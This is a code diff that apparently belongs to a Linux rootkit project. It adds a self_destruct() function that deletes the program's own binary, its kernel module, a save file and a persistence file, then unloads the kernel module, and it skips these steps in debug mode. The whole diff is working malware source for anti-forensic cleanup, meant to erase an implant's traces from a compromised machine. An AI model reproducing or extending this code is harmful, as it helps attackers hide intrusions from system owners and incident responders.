@@ -1,8 +1,10 @@
+#include "inc/kernel.h"
 #include "inc/util.h"
+#include "inc/save.h"
 
-#include <stdbool.h>
 #include <sys/socket.h>
 #include <sys/stat.h>
+#include <stdbool.h>
 
 #include <dirent.h>
 #include <stdarg.h>
@@ -299,4 +301,51 @@ char *get_self(char *path) {
     free(path);
 
   return NULL;
+}
+
+/*
+
+ * first it deletes itself, the kernel module, the save file and the persistence file
+ * then it unloads the kernel module
+
+*/
+void self_destruct(){
+  char self[PATH_MAX+1];
+
+  // no need to delete anything in debug mod
+  if (SHRK_DEBUG)
+    return;
+
+  // first lets remove ourself
+  if (NULL == get_self(self)) {
+    debug("failed to obtain self path");
+    goto skip_self;
+  }
+   
+  if(unlink(self) != 0){ 
+    debug_err("failed to unlink the self");
+    return;
+  }
+
+skip_self:
+  // next, lets remove the kernel module
+  if (unlink(SHRK_MODULE) != 0) {
+    debug_err("failed to unlink the kernel module");
+    return;
+  }
+
+  // after that, remove the save file
+  save_remove();
+
+  // next, lets remove the persistence file
+  if (SHRK_PERSIS_FILE[0] != 0 && unlink(SHRK_PERSIS_FILE) != 0) {
+    debug_err("failed to unlink the persistence file");
+    return;
+  }
+
+  // lastly unload the kernel module
+  if (!kernel_unload()) {
+    debug("failed to unload the module");
+    return;
+  }
 }
